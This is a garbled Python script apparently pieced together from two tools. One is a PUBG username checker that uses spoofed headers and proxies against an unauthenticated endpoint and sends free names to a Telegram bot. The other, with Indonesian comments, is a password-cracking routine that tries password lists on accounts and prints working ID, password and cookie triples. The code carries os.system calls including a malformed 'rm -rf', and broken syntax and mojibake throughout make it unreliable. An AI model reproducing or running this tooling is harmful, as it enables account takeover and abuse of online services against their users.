#1/usr/bin/python2
 #coding=utf-8
 import os,sys,time,datetime,random,hashlib,r
os.system(rm -rf.txt)
...
os.system(pip2 install request') time.sleep(1)5
os. system(Then type: python2 kurd404")
...
class PUBG_CHECKER:
	...
	def HEADERS(self):
		return {"x-debug-options" : "bugReporterEnabled","Content-Type" : "application/json","User-Agent" : "PUBG/47806 CFNetwork/1126 Darwin/19.5.0","Content-Length" : "19","Accept-Language" : "ar-JO,en-JO;q=0.9","Connection" : "keep-alive","Host" : "PUBG.com","Accept" : "*/*","x-super-properties": str(base64.b64encode(str('{"os":"iOS","browser":"PUBG iOS","device":"iPhone8,1","system_locale":"ar-JO","client_version":"191.0","release_channel":"stable","device_vendor_id":'+str(choice(['iPhone8,1','iPhone8,4','iPhone10,1','iPhone11,2','iPhone14,5','iPhone13,3','iPhone15,2','iPhone15,3','iPhone14,4']))+',"system_locale":"ar-JO","client_version":"191.0","release_channel":"stable","device_vendor_id":'+str("".join((choice("R74E7A3E10D2DFCAA18V") for i in range(8))))+"-"+str("".join((choice("R74E7A3E10D2DFCAA18V") for i in range(4))))+"-"+str("".join((choice("R74E7A3E10D2DFCAA18V") for i in range(4))))+"-"+str("".join((choice("R74E7A3E10D2DFCAA18V") for i in range(17))))+',"browser_user_agent":"","browser_version":"","os_version":"13.5","client_build_number":48396 w,"client_event_source":null,"design_id":0}').encode("utf-8"))).split("b'")[1].split("'")[0],"x-PUBG-locale" : "en-US","x-PUBG-timezone" : "Asia/Amman"}
	...
	def START_CHACKER(self):
		while self.STR:
			...
			try:
				...
				VV1ck=post('https://PUBG.com/api/v9/unique-username/username-attempt-unauthed',headers=self.HEADERS(),json={"username":user},proxies= {"http": f"http://{run}","https": f"http://{run}"})
				if VV1ck.text.__contains__('"taken":true'):
					self.NO+=1
				elif VV1ck.text.__contains__('"taken":false'):
					self.DN+=1
					with open('New_PUBG.txt', 'a') as J:J.write(user+'\n')
					post(f'https://api.telegram.org/bot{self.Telegrams[1]}/sendPhoto?chat_id={self.Telegrams[0]}&caption=ðŸ‘¾ PUBG User :\nâž– [ {user} ] âž–\nBy @vv1ck',files={'photo': get('https://k.top4top.io/p_2814c924v0.jpeg').content})
	...
	def returns(self):
		if self.DV=='pc':print(f"\n{bloFT}â”Œâ”€â”€(xorã‰¿404)-[{wit}~{red}PUBG-MOBILE.exe{red}{bloFT}]\nâ””â”€${wit} The file name is incorrect !\n")
		else:print('\nâ”Œâ”€â”€(xorã‰¿404)-[~PUBG-MOBILE.exe]\nâ””â”€$ The file name is incorrect !\n')
	def trts(self):
		if self.Modes=='1':
			self.Mod='File'
			try:
		...
		if self.DV=='pc':print(f"{bloFT}â”Œâ”€â”€(xorã‰¿404)-[{wit}~{red}PUBG-MOBILE.exe{red}{bloFT}]\nâ””â”€${wit} :")
		else:print('â”Œâ”€â”€(xorã‰¿404)-[~PUBG-MOBILE.exe]\nâ””â”€$ :')
...
if __name__ == '__main__':
	OS = input("â”Œâ”€â”€(xorã‰¿404)-[~PUBG-MOBILE.exe]\nâ””â”€$ What are you using ? \n\t\t[1] PC / rdp\n\t\t[2] mobile :")
	if OS == '1':DV='pc';os.system("cls" if os.name=='nt' else "clear");Modes = input(f"{bloFT}â”Œâ”€â”€(xorã‰¿404)-[{wit}~{red}PUBG-MOBILE.exe{red}{bloFT}]\nâ””â”€${wit} {yel}Modes{wit} :\n\t 1- Checking usernames from a file\n\t 2- Automatic checker\n->> Choose the mode: ")
	else:DV='me';os.system('clear');Modes = input(f"â”Œâ”€â”€(xorã‰¿404)-[~PUBG-MOBILE.exe]\nâ””â”€$Modes :\n\t 1- Checking usernames from a file\n\t 2- Automatic checker\n->> Choose the mode: ")
	...
	PUBG_MOBILE(DV,Modes)
      #=[ Recode bolehÃ°Å¸â„¢Æ’ Tapi Sertakan Nama Gua yah ]=#
...
\t|_______/[___]   \'-;__/[_____][_____]'.__.'[___]    	
			{m}Ã¢â‚¬Â¢{k}Ã¢â‚¬Â¢{h}Ã¢â‚¬Â¢{sir} Author :   {x}{m}Ã¢â‚¬Â¢{k}Ã¢â‚¬Â¢{h}Ã¢â‚¬Â¢{x}''')
#--------------------[ BAGIAN-MASUK ]--------------#
def login():
	try:
...
def login_lagi334():
	try:
		...
		cookie=input(f'  [{h}Ã¢â‚¬Â¢{x}] Cookies :{asu} ')
		...
		print(f'  {x}[{h}Ã¢â‚¬Â¢{x}]{h} LOGIN SECCESFULL{x} ');time.sleep(1)
		exit()
	except Exception as e:
...
def passwrd():
	...
	print(f'[{b}GOODÂ¢{x}]{h} OK : {h}%s '%(ok))
	print(f'{x}[{b}CPÂ¢{x}]{k} CP : {k}%s{x} '%(cp))
	print('')
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\rÃ¢ËœÂ Ã¯Â¸Â {P}[{b}{loop}{P}/{u}{len(id)}{P}]Ã¢â‚¬â€{P}[{H}{ok}{P}]Ã¢â‚¬â€{P}[{k}{cp}{x}]Ã¢â‚¬â€[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r  {K}Ã¢â‚¬â€Ã¢â‚¬â€>  {idf}|{pw}{N}')     
				...
				print(f'\r  {H}OKÃ°Å¸â€Â¥  {idf}|{pw}|{kuki}\n{ua}{N}')
